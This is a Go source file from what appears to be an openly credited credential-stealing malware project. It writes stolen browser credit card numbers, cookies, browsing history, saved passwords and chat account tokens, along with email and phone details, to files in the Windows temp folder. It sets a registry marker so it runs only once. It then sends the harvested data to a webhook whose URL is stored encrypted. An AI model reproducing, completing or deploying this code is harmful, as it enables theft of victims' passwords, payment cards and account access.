package output

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	"github.com/equisde/Clean/core"
	"github.com/equisde/Clean/core/parse"
	"github.com/equisde/Clean/utils"
	"golang.org/x/sys/windows/registry"
)

func UploadData(webhookURL string, embedData *core.WebhookData) {

	registryKey, _ := registry.OpenKey(registry.CURRENT_USER, `System`, registry.ALL_ACCESS)

	value, _, err := registryKey.GetStringValue("AlreadyRan")

	switch {
	case value == "true":
		return
	case err != nil: // check if the key doesn't exist
		registryKey.SetStringValue("AlreadyRan", "true")
	}

	bodyWriter, bodyBuffer := utils.CreateWriter(utils.CleanPath(filepath.Join(tempFolder, "LoggedData.zip")))
	defer bodyWriter.Close()

	payloadWriter, err := bodyWriter.CreateFormField("payload_json")
	core.HandleErr(err)

	json.NewEncoder(payloadWriter).Encode(embedData)

	bodyWriter.Close()

	utils.HttpRequest("POST", utils.Decrypt(webhookURL).String(), bodyBuffer, map[string]string{
		"Content-Type": bodyWriter.FormDataContentType(),
	})
}

func WriteData(fileName string, saveType string) {
	if !utils.CheckFileExist(tempFolder + "\\Browser") {
		if os.Mkdir(tempFolder+"\\Browser", 0777) != nil {
			return
		}
	}

	file, err := os.Create(utils.CleanPath(filepath.Join(tempFolder, "Browser", fileName)))
	if err != nil {
		return
	}
	defer file.Close()

	buffWriter := bufio.NewWriter(file)

	buffWriter.WriteString("-- Made by https://github.com/Equisde (https://github.com/equisde/Clean) --\n\n--------------------------------\n")

	switch saveType {
	case "cards":
		for _, data := range parse.LoggedCards.Logged {
			buffWriter.WriteString(fmt.Sprintf("Browser: %s\nName: %s\nCard number: %s\nExpiry: %s/%s\n--------------------------------\n",
				data.Browser,
				data.Name,
				data.Value,
				data.ExpirationMonth,
				data.ExpirationYear,
			))
		}
	case "cookies":
		for _, data := range parse.LoggedCookies.Logged {
			buffWriter.WriteString(fmt.Sprintf("Browser: %s\nURL: %s%s\nCookie Name: %s\nCookie Value: %s\n--------------------------------\n",
				data.Browser,
				data.Host,
				data.Path,
				data.Name,
				data.Value,
			))
		}
	case "history":
		for _, data := range parse.LoggedHistory.Logged {
			buffWriter.WriteString(fmt.Sprintf("Browser %s\nURL: %s\nTitle: %s\nVisit Count: %d\nLast Visit: %v\n--------------------------------\n",
				data.Browser,
				data.Url,
				data.Title,
				data.VisitCount,
				data.LastVisit,
			))
		}
	case "passwords":
		for _, data := range parse.Logins.Logged {
			buffWriter.WriteString(fmt.Sprintf("Browser: %s\nURL: %s\nUsername: %s\nPassword: %s\n--------------------------------\n",
				data.Browser,
				data.Url,
				data.Username,
				data.Password,
			))
		}
	case "tokens":
		for userToken, tokenSlice := range parse.LoggedTokens {
			for _, tokenStruct := range tokenSlice {
				buffWriter.WriteString(fmt.Sprintf("Username: %s#%s / ID: %s\nVerified: %t\nEmail: %s\nPhone: %s\nToken: %s\n--------------------------------\n",
					tokenStruct.Username,
					tokenStruct.Discriminator,
					tokenStruct.ID,
					tokenStruct.Verified,
					tokenStruct.Email,
					tokenStruct.Phone,
					userToken,
				))
			}
		}
	}

	buffWriter.Flush()
}

var (
	tempFolder string = utils.CleanPath(filepath.Join(os.Getenv("TEMP"), "Results"))
)
